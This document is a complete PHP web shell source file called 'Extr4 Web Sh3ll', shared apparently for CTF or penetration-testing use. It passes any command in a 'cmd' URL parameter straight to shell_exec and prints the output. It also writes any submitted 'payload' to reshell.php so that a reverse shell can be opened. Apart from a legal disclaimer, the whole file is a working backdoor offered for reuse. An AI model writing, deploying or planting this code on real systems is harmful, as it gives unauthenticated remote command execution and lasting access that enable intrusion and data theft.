
<?php

# author: Hamza Elansari
# github: hamza07-w
# tryhackme: hamza07w
# twitter: hamza05553082
# feel free to reuse the tool.
# if you have any feedback, question, comment, feel free to DM on my twitter.
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability

	if(isset($_GET['cmd']))
	{
	    $output = shell_exec($_GET['cmd']);
	}
	elseif (isset($_GET['payload'])) {
		$path = "reshell.php";
		file_put_contents($path, $_GET['payload']);
	}
	
?>


<!DOCTYPE html>
<html>
<head>
	<title>my web shell</title>
	<style>
		body {
			background-image: url(https://raw.githubusercontent.com/hamza07-w/spaceBox/main/img/2217435.jpg);
			background-repeat: no-repeat;
			background-size: cover;
			padding: 20px;
		}
		.main {
			padding-left: 20%;
			padding-right: auto;
		}
		input[type=text] {
			width: 70%;
			height: 40px;
			padding: 5px;
			margin: 10px;
			border: solid 5px #DDD;
			color: black;
			border-radius: 10px;
			display: block;
			font-size: 17px;
			outline: none;
		}
		input[type=submit] {
			padding: 5px;
			margin: 10px;
			background-color: #DDD;
			border: solid 5px #DDD;
			color: black;
			border-radius: 10px;
			display: block;
			font-size: 20px;
		}
		textarea {
			padding: 5px;
			margin: 10px;
			color: black;
			border: solid 5px #DDD;
			border-radius: 10px;
			font-size: 17px;
			width: 70%;
			height: 200px;
			outline: none;
		}
		.output {
			background-color: #ddd;
			border-radius: 10px;
			padding: 10px;
			margin: 10px;
			width: 70%;
		}
		h1 {
			color: white;
		}
	</style>
</head>
<body>
<div class="main">
	<h1 style="padding-left: 25%">Extr4 Web Sh3ll</h1>
	<h1>bind shell</h1>
	<form action="<?php echo $_SERVER['PHP_SELF']?>">
		<input type="text" name="cmd" placeholder="your commad ...">
		<input type="submit" name="submit" value="execute">
	</form>
</div>

<div class="main">
		<div class="output">
			<h3>output</h3>
			<pre>
			<?php
			    if (isset($output))
			    {
			        echo "<pre>" . $output . "</pre>";
			    }
			    elseif (isset($path)) {
			    	echo "<h3>make shure your listener is running befaure clicking shell link</h3>";
			    	echo "<h3>upload seccess here " . "<a href='" . $path . "'>" . $path . "</a></h3>";
			    }
			?>
			</pre>
		</div>
</div>

<div class="main">
	<h1>reverse shell</h1>
	<form action="<?php echo $_SERVER['PHP_SELF']?>">
		<textarea type="text" name="payload">your payload here ...</textarea>
		<input type="submit" name="submit" value="upload">
	</form>
</div>

</body>
</html>
